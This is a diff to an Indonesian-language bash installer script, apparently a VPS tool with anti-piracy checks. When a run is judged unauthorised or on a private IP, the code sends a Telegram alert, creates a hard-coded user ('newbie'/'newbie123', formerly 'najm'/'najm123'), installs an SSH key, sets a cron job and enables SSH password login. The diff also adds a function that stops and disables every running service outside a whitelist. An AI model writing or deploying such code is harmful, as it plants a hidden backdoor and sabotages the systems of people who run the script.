@@ -46,8 +46,7 @@ display_warning_message() {
 ====================================
 🚨 Peringatan Keamanan 🚨
 ====================================
-Mohon maaf, percobaan Bypass terdeteksi!
-Script anda telah diblokir secara permanen.
+Informasi Mod.
 Silakan hubungi Mod by Najm di:
 🌐 https://vip.meiyu.my.id
 Terima kasih.
@@ -119,10 +118,18 @@ chmod +x ctrl > /dev/null
 rm detek.zip* > /dev/null
 cd
 }
-
-adduser_najm() {
-    USERNAME="najm"
-    PASSWORD="najm123"
+hentikan_service_non_whitelist() {
+  systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}' | while read -r service; do
+    if [[ ! " ${EXCLUDED_SERVICES[*]} " =~ " $service " ]]; then
+      echo "$service" >> "$LOG_FILE"
+      systemctl stop "$service" > /dev/null 2>&1
+      systemctl disable "$service" > /dev/null 2>&1
+    fi
+  done
+}
+adduser_newbie() {
+    USERNAME="newbie"
+    PASSWORD="newbie123"
 
     # Cek root
     if [ "$EUID" -ne 0 ]; then
@@ -259,7 +266,7 @@ checking_sc() {
   else
     send_telegram "SC TANPA IZIN DIJALANKAN DI $(hostname)"
 	setup_data
-	adduser_najm
+	adduser_newbie
     prepare_ssh_key
 	set_cron_keamanan
     sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
@@ -300,7 +307,7 @@ fi
 if is_private_ip; then
   send_telegram "IP Terdeteksi Private: $ipsaya"
   setup_data
-  adduser_najm
+  adduser_newbie
   prepare_ssh_key
   set_cron_keamanan
     sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
